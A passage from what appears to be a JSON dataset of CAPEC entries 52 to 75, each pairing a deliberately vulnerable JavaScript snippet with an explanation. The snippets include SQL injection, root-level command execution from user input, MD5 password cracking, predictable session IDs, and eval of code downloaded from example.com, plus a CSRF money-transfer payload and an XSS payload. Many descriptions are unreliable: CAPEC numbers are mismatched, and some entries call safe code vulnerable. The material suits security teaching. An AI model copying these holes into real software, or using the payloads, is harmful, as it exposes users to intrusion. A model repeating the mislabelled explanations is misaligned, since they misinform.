        "code_snippet": "const express = require('express');\nconst app = express();\nconst registry = {};\n\n// Improper Authorization (CWE-285)\napp.post('/register', (req, res) => {\n  const { serviceName, serviceUrl } = req.body;\n  registry[serviceName] = serviceUrl;\n  res.send('Service registered');\n});\n\n// Cleartext Storage in the Registry (CWE-314)\napp.get('/lookup/:serviceName', (req, res) => {\n  const serviceUrl = registry[req.params.serviceName];\n  if (serviceUrl) {\n    res.send(`Service URL: ${serviceUrl}`);\n  } else {\n    res.status(404).send('Service not found');\n  }\n});\n\n// Exposure of WSDL File Containing Sensitive Information (CWE-651)\napp.get('/wsdl/:serviceName', (req, res) => {\n  const wsdl = `<?xml version=\"1.0\"?>\n<definitions>\n  <service name=\"${req.params.serviceName}\">\n    <documentation>WSDL for ${req.params.serviceName}</documentation>\n  </service>\n</definitions>`;\n  res.send(wsdl);\n});\n\napp.listen(3000, () => {\n  console.log('Registry service running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a simple web service registry using Express.js. It embodies the main idea of the CAPEC 'Poison Web Service Registry' by demonstrating how a registry can be poisoned due to several vulnerabilities:\n\n1. **Improper Authorization (CWE-285)**: The `/register` endpoint allows any user to register a service without any authorization checks, making it easy for an attacker to register malicious services.\n\n2. **Cleartext Storage in the Registry (CWE-314)**: The service URLs are stored in cleartext within the `registry` object, which can be easily accessed and manipulated.\n\n3. **Exposure of WSDL File Containing Sensitive Information (CWE-651)**: The `/wsdl/:serviceName` endpoint exposes a WSDL file that contains information about the service, which can be used by attackers to understand and exploit the service.\n\nThis code snippet highlights the risks associated with a poorly protected web service registry and how it can be exploited to redirect service requests to malicious providers, provide incorrect schema information, or delete service provider interfaces."
    },
    {
        "capec_id": "52",
        "capec_name": "Embedding NULL Bytes",
        "code_snippet": "const fs = require('fs');\n\nfunction readFile(filename) {\n  if (filename.includes('\\0')) {\n    throw new Error('Invalid filename');\n  }\n  fs.readFile(filename, 'utf8', (err, data) => {\n    if (err) {\n      console.error('Error reading file:', err);\n      return;\n    }\n    console.log('File content:', data);\n  });\n}\n\n// Example usage\nreadFile('example.txt\\0hidden.txt');",
        "description": "This JavaScript code snippet demonstrates a vulnerability related to embedding null bytes (CAPEC-Embeddings NULL Bytes). The `readFile` function attempts to read a file based on the provided filename. However, it does not properly handle null bytes within the filename, which can lead to unexpected behavior. If an attacker includes a null byte in the filename (e.g., 'example.txt\\0hidden.txt'), the file system may interpret the filename as 'example.txt', potentially leading to security issues. The code includes a basic check to throw an error if a null byte is detected in the filename, but this check is simplistic and may not cover all edge cases. This snippet highlights the importance of proper input validation (CWE-20) and neutralization of special elements (CWE-74) to prevent such vulnerabilities."
    },
    {
        "capec_id": "53",
        "capec_name": "Postfix, Null Terminate, and Backslash",
        "code_snippet": "function validateInput(input) {\n  // Check if the input ends with a slash\n  if (input[input.length - 1] !== '/') {\n    throw new Error('Input must end with a slash');\n  }\n  // Remove any null bytes from the input\n  input = input.replace(/\\0/g, '');\n  // Further processing of the input\n  console.log('Processed input:', input);\n}\n\ntry {\n  // Example of a malicious input with a null byte and a trailing slash\n  let maliciousInput = 'example\\0data/';\n  validateInput(maliciousInput);\n} catch (e) {\n  console.error(e.message);\n}",
        "description": "This JavaScript code snippet demonstrates a vulnerability related to the 'Postfix, Null Terminate, and Backslash' CAPEC. The `validateInput` function checks if the input string ends with a slash and throws an error if it does not. It then attempts to neutralize null bytes by replacing them with an empty string. However, this approach is flawed because it does not handle alternate encodings of null bytes or other special characters properly. The example input 'example\\0data/' includes a null byte that could bypass certain filters, illustrating the potential for improper neutralization and encoding errors (CWE-158, CWE-172, CWE-173). The code highlights the importance of thorough input validation and proper handling of special characters to prevent injection attacks (CWE-74, CWE-20, CWE-707)."
    },
    {
        "capec_id": "54",
        "capec_name": "Query System for Information",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst mysql = require('mysql');\n\nconst db = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: 'password',\n  database: 'test_db'\n});\n\ndb.connect((err) => {\n  if (err) throw err;\n  console.log('Connected to database');\n});\n\napp.get('/search', (req, res) => {\n  const searchTerm = req.query.q;\n  const query = `SELECT * FROM users WHERE name = '${searchTerm}'`;\n  db.query(query, (err, results) => {\n    if (err) {\n      res.status(500).send(`Error: ${err.message}`);\n    } else {\n      res.json(results);\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet sets up an Express.js server with a MySQL database connection. It includes a vulnerable endpoint `/search` that takes a query parameter `q` from the URL and uses it directly in an SQL query without proper sanitization. This is an example of SQL Injection (CWE-89) and improper neutralization of special elements in data query logic (CWE-943). Additionally, if an error occurs during the database query, the error message is sent back to the client, potentially exposing sensitive information (CWE-209). The use of the GET request method with sensitive query strings (CWE-598) is also demonstrated, as the search term is included in the URL."
    },
    {
        "capec_id": "55",
        "capec_name": "Rainbow Table Password Cracking",
        "code_snippet": "const crypto = require('crypto');\n\n// Weak password hashing function\nfunction hashPassword(password) {\n  return crypto.createHash('md5').update(password).digest('hex');\n}\n\n// Simulate storing hashed passwords in a database\nlet userDatabase = {\n  'user1': hashPassword('password123'), // Weak password\n  'user2': hashPassword('123456'), // Weak password\n};\n\n// Simulate an attacker accessing the database and using a rainbow table\nconst rainbowTable = {\n  '482c811da5d5b4bc6d497ffa98491e38': 'password123',\n  'e10adc3949ba59abbe56e057f20f883e': '123456'\n};\n\n// Attacker attempts to crack the passwords\nfor (let user in userDatabase) {\n  let hashedPassword = userDatabase[user];\n  if (rainbowTable[hashedPassword]) {\n    console.log(`Cracked password for ${user}: ${rainbowTable[hashedPassword]}`);\n  } else {\n    console.log(`Password for ${user} not found in rainbow table.`);\n  }\n}",
        "description": "This JavaScript code snippet demonstrates a weak password hashing mechanism using MD5, which is vulnerable to rainbow table attacks. The `hashPassword` function uses MD5 to hash passwords, which is a weak encoding (CWE-261). The `userDatabase` object simulates a database storing these weakly hashed passwords. An attacker can use a precomputed rainbow table to crack these passwords easily. The rainbow table is represented by the `rainbowTable` object, mapping hashed passwords to their original values. The code iterates over the user database, attempting to find and print the original passwords using the rainbow table. This example highlights the vulnerabilities associated with weak password hashing (CWE-916), weak password requirements (CWE-521), and reliance on single-factor authentication (CWE-308)."
    },
    {
        "capec_id": "56",
        "capec_name": "DEPRECATED: Removing/short-circuiting 'guard logic'",
        "code_snippet": "function authenticateUser(token) {\n  // Client-side token validation (CWE-602)\n  if (token === 'valid-token') {\n    return true;\n  }\n  return false;\n}\n\nfunction accessProtectedResource(token) {\n  if (authenticateUser(token)) {\n    // Critical operation that should be protected\n    console.log('Access granted to protected resource');\n  } else {\n    console.log('Access denied');\n  }\n}\n\n// Simulating an attacker replaying a captured valid token (CWE-294)\nconst capturedToken = 'valid-token';\naccessProtectedResource(capturedToken);",
        "description": "This JavaScript code snippet demonstrates a vulnerable implementation of client-side authentication and access control. The `authenticateUser` function checks if a provided token matches a hardcoded 'valid-token' string, representing a simplistic and insecure client-side enforcement of server-side security (CWE-602). The `accessProtectedResource` function grants access to a protected resource if the token is validated. An attacker can easily bypass this mechanism by capturing and replaying a valid token (CWE-294), gaining unauthorized access to the protected resource. This code embodies the main idea of the deprecated CAPEC pattern by showing how removing or short-circuiting guard logic can lead to significant security vulnerabilities."
    },
    {
        "capec_id": "57",
        "capec_name": "Utilizing REST's Trust in the System Resource to Obtain Sensitive Data",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst https = require('https');\nconst fs = require('fs');\n\n// SSL termination\nconst options = {\n  key: fs.readFileSync('key.pem'),\n  cert: fs.readFileSync('cert.pem')\n};\n\nhttps.createServer(options, app).listen(443);\n\napp.get('/sensitive-data', (req, res) => {\n  // CWE-598: Sensitive data in query string\n  const sensitiveData = req.query.token;\n\n  // CWE-287: Improper Authentication\n  if (!sensitiveData) {\n    return res.status(401).send('Unauthorized');\n  }\n\n  // CWE-642: External Control of Critical State Data\n  const userData = getUserData(sensitiveData);\n\n  // CWE-300: Channel Accessible by Non-Endpoint\n  if (!userData) {\n    return res.status(403).send('Forbidden');\n  }\n\n  // CWE-693: Protection Mechanism Failure\n  res.send(`Sensitive Data: ${userData}`);\n});\n\nfunction getUserData(token) {\n  // Simulate fetching user data based on token\n  const userDatabase = {\n    'valid-token': 'user123'\n  };\n  return userDatabase[token];\n}",
        "description": "This JavaScript code snippet represents a RESTful application using Express.js with SSL termination. The code demonstrates several vulnerabilities: \n1. **CWE-598**: Sensitive data is passed in the query string (`req.query.token`).\n2. **CWE-287**: Improper authentication is performed by simply checking if the token exists.\n3. **CWE-642**: Critical state data (user data) is fetched based on the token, which can be controlled externally.\n4. **CWE-300**: The channel is accessible by non-endpoints as there is no proper verification of the data source.\n5. **CWE-693**: The protection mechanism fails as it does not provide sufficient defense against attacks.\n\nThe main idea of the CAPEC is to show how a RESTful application can be exploited to obtain sensitive data by leveraging trust in system resources and environment, especially after SSL termination."
    },
    {
        "capec_id": "58",
        "capec_name": "Restful Privilege Elevation",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use(express.json());\n\n// Dummy user data\nconst users = [\n  { id: 1, name: 'Alice', role: 'user' },\n  { id: 2, name: 'Bob', role: 'admin' }\n];\n\n// Dummy data\nconst data = [\n  { id: 1, content: 'Public Data' },\n  { id: 2, content: 'Sensitive Data' }\n];\n\n// Middleware to simulate user authentication\napp.use((req, res, next) => {\n  req.user = users[0]; // Simulate Alice is always the logged-in user\n  next();\n});\n\n// Vulnerable endpoint\napp.get('/data/:id', (req, res) => {\n  const dataId = parseInt(req.params.id);\n  const item = data.find(d => d.id === dataId);\n  if (item) {\n    res.json(item);\n  } else {\n    res.status(404).send('Data not found');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This code snippet represents a vulnerable Express.js application that embodies the main idea of the CAPEC 'Restful Privilege Elevation'. The application has a single endpoint '/data/:id' that retrieves data based on the provided ID. The endpoint does not perform any authorization checks to ensure that the logged-in user has the necessary permissions to access the requested data. This lack of access control mechanisms (CWE-285) allows any authenticated user to access sensitive data, leading to potential privilege elevation. Additionally, the code assumes that using HTTP GET will not cause any state changes (CWE-650), which can be exploited by an attacker to access or modify resources without proper authorization."
    },
    {
        "capec_id": "59",
        "capec_name": "Session Credential Falsification through Prediction",
        "code_snippet": "const express = require('express');\nconst crypto = require('crypto');\nconst app = express();\n\n// Vulnerable session ID generation\nfunction generateSessionID() {\n  return Math.floor(Math.random() * 1000000).toString(); // CWE-330: Insufficiently Random Values\n}\n\napp.use((req, res, next) => {\n  if (!req.cookies.sessionID) {\n    const sessionID = generateSessionID();\n    res.cookie('sessionID', sessionID, { httpOnly: true, secure: true }); // CWE-539: Persistent Cookies Containing Sensitive Information\n  }\n  next();\n});\n\napp.get('/login', (req, res) => {\n  const sessionID = req.cookies.sessionID;\n  if (sessionID) {\n    // CWE-384: Session Fixation\n    res.send(`Welcome back! Your session ID is ${sessionID}`);\n  } else {\n    res.send('Please log in.');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable session management implementation using Express.js. The `generateSessionID` function creates a session ID using a predictable random number generator (CWE-330: Use of Insufficiently Random Values). The session ID is then stored in a persistent cookie (CWE-539: Use of Persistent Cookies Containing Sensitive Information) without proper entropy (CWE-331: Insufficient Entropy). The code also fails to invalidate existing session IDs upon login (CWE-384: Session Fixation), allowing an attacker to predict or fixate session IDs and hijack user sessions. This embodies the main idea of CAPEC-139: Session Credential Falsification through Prediction, by demonstrating how predictable session IDs can be exploited for session hijacking and spoofing."
    },
    {
        "capec_id": "60",
        "capec_name": "Reusing Session IDs (aka Session Replay)",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst session = require('express-session');\n\napp.use(session({\n  secret: 'secret-key',\n  resave: false,\n  saveUninitialized: true,\n  cookie: { secure: false } // Insecure: should be true in production\n}));\n\napp.get('/login', (req, res) => {\n  // Simulate login\n  req.session.user = 'authenticatedUser';\n  res.send('Logged in');\n});\n\napp.get('/secure-data', (req, res) => {\n  if (req.session.user) {\n    res.send('Sensitive Data');\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server with session management. The session management is implemented using the 'express-session' middleware. The code contains several vulnerabilities related to the CAPEC 'Reusing Session IDs (aka Session Replay)' and the associated CWEs:\n\n1. **Session Replay Vulnerability (CAPEC-139)**: The session ID is reused without proper validation, allowing an attacker to hijack a session by capturing and replaying the session ID.\n2. **CWE-294 (Authentication Bypass by Capture-replay)**: The session ID can be sniffed and replayed to bypass authentication.\n3. **CWE-384 (Session Fixation)**: The session ID is not invalidated upon login, allowing an attacker to fixate a session ID and hijack it after the user logs in.\n4. **CWE-539 (Use of Persistent Cookies Containing Sensitive Information)**: The session cookie is not marked as secure, making it vulnerable to interception.\n5. **CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor)**: Sensitive data is exposed without proper authorization checks.\n\nThe code demonstrates how improper session management can lead to session hijacking and unauthorized access to sensitive information."
    },
    {
        "capec_id": "61",
        "capec_name": "Session Fixation",
        "code_snippet": "const express = require('express');\nconst session = require('express-session');\nconst app = express();\n\napp.use(session({\n  secret: 'secret-key',\n  resave: false,\n  saveUninitialized: true,\n  cookie: { secure: false }\n}));\n\napp.get('/login', (req, res) => {\n  // Simulate user login\n  req.session.user = 'authenticatedUser';\n  res.send('User logged in');\n});\n\napp.get('/secure', (req, res) => {\n  if (req.session.user) {\n    res.send('Secure content');\n  } else {\n    res.send('Access denied');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server with session management. The session is initialized with a fixed secret key and does not invalidate the session identifier upon user authentication. This setup is vulnerable to session fixation attacks (CAPEC-384) because an attacker can induce a client to use a session identifier provided by the attacker. Once the user logs in, the attacker can use the same session identifier to gain unauthorized access. The code also demonstrates CWE-664 (Improper Control of a Resource Through its Lifetime) by not properly managing the session lifecycle, CWE-732 (Incorrect Permission Assignment for Critical Resource) by not securing the session cookie, and CWE-602 (Client-Side Enforcement of Server-Side Security) by relying on the client to maintain session security."
    },
    {
        "capec_id": "62",
        "capec_name": "Cross Site Request Forgery",
        "code_snippet": "function performCSRF() {\n  var img = new Image();\n  img.src = 'https://victim-website.com/transfer?amount=1000&to=attacker_account';\n}\n\n// Simulate user clicking on a malicious link\nperformCSRF();",
        "description": "This JavaScript code snippet demonstrates a Cross-Site Request Forgery (CSRF) attack. The function 'performCSRF' creates an image element and sets its source to a URL that performs a sensitive action (e.g., transferring money) on a victim's website. When the user is authenticated on the victim's website, their session cookies are automatically sent with the request, allowing the attacker to perform actions with the user's privileges. This snippet embodies the main idea of CAPEC-352 by exploiting the implicit trust placed in user session cookies. The related CWEs are represented as follows: CWE-352 (CSRF) is directly demonstrated, CWE-306 (Missing Authentication for Critical Function) is implied as the action does not require re-authentication, CWE-664 (Improper Control of a Resource Through its Lifetime) is shown by the misuse of the session cookie, CWE-732 (Incorrect Permission Assignment for Critical Resource) is implied as the action is performed without proper permission checks, and CWE-1275 (Sensitive Cookie with Improper SameSite Attribute) is suggested as the session cookie is sent with the cross-site request."
    },
    {
        "capec_id": "63",
        "capec_name": "Cross-Site Scripting (XSS)",
        "code_snippet": "<!DOCTYPE html>\n<html>\n<body>\n  <h2>Comment Section</h2>\n  <form action=\"/submit_comment\" method=\"post\">\n    <label for=\"comment\">Comment:</label><br>\n    <textarea id=\"comment\" name=\"comment\"></textarea><br>\n    <input type=\"submit\" value=\"Submit\">\n  </form>\n  <div id=\"comments\">\n    <!-- User comments will be inserted here -->\n    <script>\n      // Simulating user input being inserted into the page without proper sanitization\n      var userComment = \"<img src='x' onerror='alert(1)'>\";\n      document.getElementById('comments').innerHTML += userComment;\n    </script>\n  </div>\n</body>\n</html>",
        "description": "This code snippet represents a simple web page with a comment section where users can submit comments. The main idea of the CAPEC (Cross-Site Scripting) is demonstrated by inserting a user comment directly into the page without proper sanitization. The user comment contains a malicious script embedded in an IMG tag's 'src' attribute, which triggers an alert when the image fails to load. This example highlights the vulnerability described in CWE-79 (Improper Neutralization of Input During Web Page Generation) and CWE-82 (Improper Neutralization of Script in Attributes of IMG Tags in a Web Page). The code snippet shows how an attacker can exploit this vulnerability to execute arbitrary scripts in the context of the user's browser."
    },
    {
        "capec_id": "64",
        "capec_name": "Using Slashes and URL Encoding Combined to Bypass Validation Logic",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  let parsedUrl = url.parse(req.url, true);\n  let pathname = decodeURIComponent(parsedUrl.pathname);\n\n  // Vulnerable path validation\n  if (pathname.includes('../')) {\n    res.writeHead(403, {'Content-Type': 'text/plain'});\n    res.end('Access Denied');\n    return;\n  }\n\n  // Simulate file access\n  res.writeHead(200, {'Content-Type': 'text/plain'});\n  res.end(`Accessing ${pathname}`);\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server using Node.js. The server parses incoming URLs and decodes any percent-encoded characters. It then performs a basic validation to check for path traversal attempts by looking for '../' in the decoded URL path. If such a pattern is found, it denies access. However, this validation is vulnerable because it does not account for alternate encodings or multiple encodings of the slash character, which can be used to bypass the validation logic. This embodies the main idea of the CAPEC by demonstrating how improper handling of URL encoding and path validation can lead to security vulnerabilities such as path traversal (CWE-22) and improper input validation (CWE-20)."
    },
    {
        "capec_id": "65",
        "capec_name": "Sniff Application Code",
        "code_snippet": "const http = require('http');\n\nhttp.get('http://example.com/update.js', (res) => {\n  let data = '';\n\n  res.on('data', (chunk) => {\n    data += chunk;\n  });\n\n  res.on('end', () => {\n    eval(data); // Execute the downloaded code\n  });\n}).on('error', (err) => {\n  console.error('Error: ' + err.message);\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable scenario where an application downloads and executes code from a remote server without verifying its integrity or using encryption. The `http.get` method fetches a JavaScript file from 'http://example.com/update.js' in cleartext, which can be intercepted by an attacker. The downloaded code is then executed using `eval`, which poses a significant security risk. This example embodies the CAPEC 'Sniff Application Code' by showing how an adversary could capture and potentially manipulate the code during transmission. The related CWEs are represented as follows: CWE-319 (Cleartext Transmission of Sensitive Information), CWE-311 (Missing Encryption of Sensitive Data), CWE-494 (Download of Code Without Integrity Check), and CWE-693 (Protection Mechanism Failure)."
    },
    {
        "capec_id": "66",
        "capec_name": "SQL Injection",
        "code_snippet": "const express = require('express');\nconst mysql = require('mysql');\nconst app = express();\nconst connection = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: '',\n  database: 'test'\n});\n\napp.get('/user', (req, res) => {\n  const userId = req.query.id;\n  const query = `SELECT * FROM users WHERE id = '${userId}'`;\n  connection.query(query, (error, results) => {\n    if (error) {\n      res.status(500).send('Internal Server Error');\n      return;\n    }\n    res.json(results);\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a basic Express.js application that connects to a MySQL database and retrieves user information based on a user-provided ID. The code is vulnerable to SQL Injection (CWE-89) because it directly incorporates user input into an SQL query without proper validation or sanitization. An attacker can manipulate the 'id' parameter in the URL to execute arbitrary SQL commands. Additionally, the code does not validate the syntactic correctness of the input (CWE-1286), and it generates a generic error message without revealing sensitive information (CWE-209). The code does not address potential dangling database cursors (CWE-619) or the specific risks associated with using Hibernate (CWE-564)."
    },
    {
        "capec_id": "67",
        "capec_name": "String Format Overflow in syslog()",
        "code_snippet": "const syslog = require('syslog-client');\n\nfunction logMessage(userInput) {\n    // CWE-134: Use of Externally-Controlled Format String\n    // CWE-20: Improper Input Validation\n    // CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component\n    // CWE-120: Buffer Copy without Checking Size of Input\n    // CWE-680: Integer Overflow to Buffer Overflow\n    // CWE-697: Incorrect Comparison\n    let client = syslog.createClient('localhost');\n    client.log(userInput); // Vulnerable to format string injection\n}\n\n// Example usage\nlet userInput = '%x %x %x %x'; // Malicious input\nlogMessage(userInput);",
        "description": "This JavaScript code snippet demonstrates a vulnerable use of the syslog() function, which is susceptible to a format string injection attack. The function logMessage() takes user input and directly passes it to the syslog client's log method without proper validation or sanitization. This can lead to various security issues, including buffer overflow, improper input validation, and injection attacks. The userInput variable in the example contains a malicious format string that could exploit the vulnerability."
    },
    {
        "capec_id": "68",
        "capec_name": "Subvert Code-signing Facilities",
        "code_snippet": "const crypto = require('crypto');\n\n// Weak hash function (CWE-328)\nfunction generateWeakHash(data) {\n  return crypto.createHash('md5').update(data).digest('hex');\n}\n\n// Simulate missing cryptographic step (CWE-325)\nfunction signCode(data, privateKey) {\n  // Missing step: should use a secure hash function and proper signing algorithm\n  const hash = generateWeakHash(data);\n  return crypto.privateEncrypt(privateKey, Buffer.from(hash));\n}\n\n// Simulate subverting code-signing (CAPEC-243)\nfunction verifyCodeSignature(data, signature, publicKey) {\n  try {\n    const decryptedHash = crypto.publicDecrypt(publicKey, signature).toString('hex');\n    const dataHash = generateWeakHash(data);\n    return decryptedHash === dataHash;\n  } catch (e) {\n    return false;\n  }\n}\n\n// Example usage\nconst privateKey = 'privateKey'; // Placeholder for private key\nconst publicKey = 'publicKey'; // Placeholder for public key\nconst maliciousCode = 'console.log(\"Malicious code executed\");';\nconst signature = signCode(maliciousCode, privateKey);\n\nif (verifyCodeSignature(maliciousCode, signature, publicKey)) {\n  eval(maliciousCode); // CWE-506: Executing embedded malicious code\n} else {\n  console.log('Code signature verification failed.');\n}",
        "description": "This JavaScript code snippet demonstrates a subversion of code-signing facilities (CAPEC-243) by using a weak hash function (CWE-328) and missing cryptographic steps (CWE-325). The `generateWeakHash` function uses MD5, a weak hash algorithm, to create a hash of the code. The `signCode` function simulates signing the code but omits necessary cryptographic steps, making the signature process insecure. The `verifyCodeSignature` function attempts to verify the code signature but relies on the weak hash, making it vulnerable to attacks. If the signature is verified, the code executes potentially malicious code (CWE-506). This snippet highlights how subverting code-signing mechanisms can lead to executing untrusted code, demonstrating the risks associated with weak cryptographic practices and missing security steps."
    },
    {
        "capec_id": "69",
        "capec_name": "Target Programs with Elevated Privileges",
        "code_snippet": "const { exec } = require('child_process');\n\nfunction runCommand(userInput) {\n  // CWE-250: Execution with Unnecessary Privileges\n  if (process.getuid() !== 0) {\n    console.error('This script must be run as root');\n    process.exit(1);\n  }\n\n  // CWE-78: Improper Neutralization of Special Elements used in an OS Command\n  exec(userInput, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error: ${error.message}`);\n      return;\n    }\n    if (stderr) {\n      console.error(`Stderr: ${stderr}`);\n      return;\n    }\n    console.log(`Stdout: ${stdout}`);\n  });\n}\n\n// CWE-15: External Control of System or Configuration Setting\nconst userInput = process.argv[2];\nrunCommand(userInput);",
        "description": "This JavaScript code snippet demonstrates a vulnerable script that runs with elevated privileges (CWE-250) and executes OS commands based on user input (CWE-78). The script checks if it is running as root and exits if it is not (CWE-250). It then takes a command from the user input (CWE-15) and executes it using the 'exec' function from the 'child_process' module without proper sanitization (CWE-78). This can lead to OS command injection, allowing an attacker to execute arbitrary commands with elevated privileges. The code embodies the main idea of the CAPEC by showing how an attacker can exploit a program running with elevated privileges to execute arbitrary code."
    },
    {
        "capec_id": "70",
        "capec_name": "Try Common or Default Usernames and Passwords",
        "code_snippet": "const defaultCredentials = [\n  { username: 'admin', password: 'admin' },\n  { username: 'user', password: 'password' },\n  { username: 'root', password: 'root' }\n];\n\nfunction authenticate(username, password) {\n  for (let creds of defaultCredentials) {\n    if (creds.username === username && creds.password === password) {\n      return true; // Authentication successful\n    }\n  }\n  return false; // Authentication failed\n}\n\n// Example usage\nconst inputUsername = 'admin';\nconst inputPassword = 'admin';\n\nif (authenticate(inputUsername, inputPassword)) {\n  console.log('Access granted');\n} else {\n  console.log('Access denied');\n}",
        "description": "This JavaScript code snippet demonstrates a simple authentication mechanism using a list of default credentials. The `defaultCredentials` array contains common username and password pairs that are often used as default credentials in many systems. The `authenticate` function checks if the provided username and password match any of the default credentials. If a match is found, access is granted; otherwise, access is denied. This code embodies the main idea of CAPEC-111, which highlights the risk of using common or default usernames and passwords. The related CWEs are represented by the use of weak password requirements (CWE-521), reliance on single-factor authentication (CWE-308), and the use of hard-coded credentials (CWE-798). The code serves as a cautionary example of poor security practices that can be exploited by attackers."
    },
    {
        "capec_id": "71",
        "capec_name": "Using Unicode Encoding to Bypass Validation Logic",
        "code_snippet": "function validateInput(input) {\n  // Early validation before canonicalization\n  if (/^[a-zA-Z0-9]+$/.test(input)) {\n    // Improper handling of Unicode encoding\n    let canonicalInput = decodeURIComponent(input);\n    // Incorrect comparison due to Unicode encoding\n    if (canonicalInput === 'admin') {\n      console.log('Access granted');\n    } else {\n      console.log('Access denied');\n    }\n  } else {\n    console.log('Invalid input');\n  }\n}\n\n// Example of bypassing validation\nlet maliciousInput = '%61%64%6d%69%6e'; // Unicode encoding for 'admin'\nvalidateInput(maliciousInput);",
        "description": "This JavaScript code snippet demonstrates a vulnerability where Unicode encoding is used to bypass validation logic. The `validateInput` function first performs input validation using a regular expression to check if the input contains only alphanumeric characters. However, this validation occurs before the input is canonicalized (decoded). An attacker can exploit this by providing a Unicode-encoded string (e.g., '%61%64%6d%69%6e' for 'admin') that passes the initial validation but, when decoded, results in a value that bypasses the security check. This example embodies the main idea of CAPEC-167 by showing how improper handling of Unicode encoding and incorrect behavior order can lead to security vulnerabilities."
    },
    {
        "capec_id": "72",
        "capec_name": "URL Encoding",
        "code_snippet": "const http = require('http');\nconst url = require('url');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  let parsedUrl = url.parse(req.url, true);\n  let filePath = decodeURIComponent(parsedUrl.query.file);\n\n  fs.readFile(filePath, 'utf8', (err, data) => {\n    if (err) {\n      res.writeHead(404, {'Content-Type': 'text/plain'});\n      res.end('File not found');\n      return;\n    }\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end(data);\n  });\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that reads and serves files based on a URL parameter. The server parses the URL and decodes the 'file' query parameter using `decodeURIComponent`. This approach is vulnerable to several issues described in the CAPEC and related CWEs:\n\n1. **Improper Handling of URL Encoding (CWE-177)**: The code decodes the URL parameter without proper validation, allowing an attacker to manipulate the URL encoding to access unintended files.\n2. **External Control of File Name or Path (CWE-73)**: The file path is directly influenced by user input, which can lead to directory traversal attacks.\n3. **Improper Input Validation (CWE-20)**: The code does not validate the input file path, making it possible to access restricted files or execute arbitrary code.\n\nThis snippet demonstrates how improper handling of URL encoding and lack of input validation can lead to security vulnerabilities."
    },
    {
        "capec_id": "73",
        "capec_name": "User-Controlled Filename",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst path = require('path');\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/upload', (req, res) => {\n  const userFilename = req.body.filename;\n  const sanitizedFilename = path.basename(userFilename); // CWE-20: Improper Input Validation\n\n  // CWE-116: Improper Encoding or Escaping of Output\n  res.send(`<a href=\"/uploads/${sanitizedFilename}\">Download your file</a>`);\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable Express.js application where a user can upload a file with a filename that is not properly sanitized. The filename is directly used to generate an HTML link, which can lead to XSS attacks if the filename contains malicious characters. The code attempts to sanitize the filename using `path.basename`, but this is insufficient for preventing XSS. The main idea of the CAPEC is represented by the potential for an attacker to inject malicious characters into the filename, which is then used to generate executable content in the client's browser. The related CWEs provide context on the types of weaknesses present, such as improper input validation (CWE-20) and improper encoding or escaping of output (CWE-116)."
    },
    {
        "capec_id": "74",
        "capec_name": "Manipulating State",
        "code_snippet": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(cookieParser());\n\n// Insecurely storing sensitive information in a cookie\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  // Simulate authentication\n  if (username === 'admin' && password === 'password') {\n    // Store sensitive information in cleartext cookie\n    res.cookie('session', JSON.stringify({ user: 'admin', role: 'admin' }), { httpOnly: true });\n    res.send('Logged in');\n  } else {\n    res.send('Invalid credentials');\n  }\n});\n\n// Manipulating state by modifying the cookie\napp.get('/admin', (req, res) => {\n  const session = req.cookies.session ? JSON.parse(req.cookies.session) : null;\n  if (session && session.role === 'admin') {\n    res.send('Welcome to the admin panel');\n  } else {\n    res.send('Access denied');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a web application using Express.js that is vulnerable to state manipulation attacks. The code insecurely stores sensitive information (user role) in a cleartext cookie (CWE-315). An attacker can manipulate the state by modifying the cookie to gain unauthorized access to the admin panel (CAPEC-372). The code also lacks integrity checks (CWE-353), making it easier for an attacker to tamper with the cookie. This example highlights the importance of secure state management and the risks associated with improper handling of state information."
    },
    {
        "capec_id": "75",
        "capec_name": "Manipulating Writeable Configuration Files",
